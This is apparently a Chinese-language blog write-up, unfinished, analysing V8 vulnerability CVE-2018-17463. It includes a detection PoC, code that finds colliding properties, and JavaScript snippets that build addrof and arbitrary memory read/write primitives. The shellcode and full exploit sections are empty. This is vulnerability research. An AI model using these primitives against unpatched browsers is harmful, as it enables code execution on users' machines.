---
layout:     post
title:      "V8引擎CVE-2018-17463漏洞分析（工事中）"
subtitle:   ""
date:       2019-9-4 22:30:00
author:     "GToad"
header-img: "img/android-five.png"
catalog: true
tags:
    - chrome
    - v8
    - exploit
    - cve
    - browser
---

> 本文为本博客V8系列第四篇。

## 漏洞基本信息

[漏洞信息页面](https://bugs.chromium.org/p/chromium/issues/detail?id=888923)
[漏洞修复代码](https://chromium.googlesource.com/v8/v8.git/+/52a9e67a477bdb67ca893c25c145ef5191976220)

根据漏洞基本信息可准备分析环境，先切换至漏洞修复前版本。
```
git checkout 568979f4d891bafec875fab20f608ff9392f4f29
gclient sync
```

对源码进行编译。
```
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
```

## PoC


```javascript
function check_vul(){
    function bad_create(x){
        x.a;
        Object.create(x);
        return x.b;

    }

    for (let i = 0;i < 10000; i++){
        let x = {a : 0x1234};
        x.b = 0x5678; 
        let res = bad_create(x);
        //log(res);
        if( res != 0x5678){
            console.log(i);
            console.log("CVE-2018-17463 exists in the d8");
            return;
        }

    }
    throw "bad d8 version";

}
check_vul();
```

![](/img/in-post/post-cve20165198/poc-core-dumped.png)

POC代码执行后，res的取值将会发生错误，从而导致输出“CVE-2018-17463 exists in the d8”语句。

## 漏洞成因

漏洞成因是原本分开保存的各个属性在`Object.create()`后会被整理到一个大的hash表结构里。但是JIT后的函数不知道，依旧按照最初保存在变量结构体里的偏移去取，导致下方的内存泄露。

## 漏洞利用

#### 确定偏移

使用POC的代码即可稳定触发漏洞，但是我们发现每次执行后，hash表中的顺序会不断变化，从而导致漏洞利用过程中各个属性所对应的偏移大小无法确定。


但是存在另一个规律，在同一次执行过程中，相同属性构造的`Object`，在`DictionaryProperties`中的偏移是相同的，执行如下代码：
```javascript
let a1 = {x : 1,y:2,z:3};
a1.b = 4;
a1.c = 5;
a1.d = 6;
let a2 = {x : 2,y:3,z:4};
a2.b = 7;
a2.c = 8;
a2.d = 9;
Object.create(a1);
%DebugPrint(a1);
Object.create(a2);
%DebugPrint(a2);
readline();
```

通过调试发现，尽管a1，a2的属性值是不同的，但是每个相同名称的属性的位置是相同的。

![](/img/in-post/post-cve20165198/poc-core-dumped.png)

因此，根据这个规律我们可以得到这样一个方法：在一次利用中，只要找到一对可以用于类型混淆的属性名就可以作为先验知识一直使用。有了这对属性，假设为a.x1和a.x2，那么就可以返回a.x1而的到a.x2的值，从而造成类型混淆。

搜索X1、X2对的代码如下：

```javascript
// check collision between directory mode and fast mode
let OPTIMIZATION_NUM = 10000
let OBJ_LEN  = 0x30

function getOBJ(){
    let res = {a:0x1234};
    for (let i = 0; i< OBJ_LEN;i++){
        eval(`res.${'b'+i} = -${0x4869 + i};
        `);        
    }
    return res;
}

function findCollision(){
    let find_obj = [];
    for (let i = 0;i<OBJ_LEN;i++){
        find_obj[i] = 'b'+i;
    }
    eval(`
        function bad_create(x){
            x.a;
            this.Object.create(x);
            ${find_obj.map((b) => `let ${b} = x.${b};`).join('\n')}
            return [${find_obj.join(', ')}];
        }
    `);
    for (let i = 0; i<OPTIMIZATION_NUM;i++){
        let tmp = bad_create(getOBJ());
        for (let j = 0 ;j<tmp.length;j++){
            if(tmp[j] != -(j+0x4869) && tmp[j] < -0x4868 && tmp[j] > -(1+OBJ_LEN +0x4869) ){
                console.log('b'+ j +' & b' + -(tmp[j]+0x4869) +" are collision in directory");
                return ['b'+j , 'b' + -(tmp[j]+0x4869)];
            }
        }
    }
    throw "not found collision ";
}
findCollision();
```

从下面的结果可发现，在每次执行中，键值对都不同：

![](/img/in-post/post-cve20165198/poc-core-dumped.png)

在这以后，便可以使用得到的键值对造成类型混淆。

#### addrof原语
假设得到的键值对为X和Y。则构建一个全新的`Object`：

```javascript
o.X = {x1:1.1,x2:1.2};
o.Y = {y1:obj};
```

并且构造恶意函数：
```javascript
function bad_create(o){
    o.a;
    this.Object.create(o);
    return o.X.x1;
}
```

那么在返回`o.X.x1`的时候，实际上返回的是obj结构体的地址，从而对浮点型进行转换就可以得到对应obj地址了。`值得注意的是，这里的X和Y是hash里位置最上面的第一个元素和越界读写重合。也就是说也可以选择hash里第二、第三个目标元素的位置。`

#### 任意地址读写原语

通常任意地址读写需要利用`ArrayBuffer`对象的`backing_store`属性，该属性指向分配的Buffer空间，因此，修改它为目标地址即可对目标地址进行读写操作。我们发现如果构建`Object`为`{x0:{x1:1.1,x2:1.2}}`，则对`x0.x2`的写操作恰好可以改变对应键值的`backing_store`，造成内存任意写。

因此，恶意函数构造如下：
```javascript
function bad_create(o,value){
    o.a;
    this.Object.create(o);
    let ret = o.${X}.x0.x2;
     o.${X}.x0.x2 = value;
    return ret;
}
```

#### Shellcode执行

利用wasm机制来开辟一块`rwx`的内存空间，代码如下：
```javascript

```
![](/img/in-post/post-cve20165198/poc-core-dumped.png)

## 最终效果

成功使得v8执行了Shellcode后弹出了计算器。

![](/img/in-post/post-cve20165198/poc-core-dumped.png)

## EXP

最终完整EXP如下：

```javascript

```





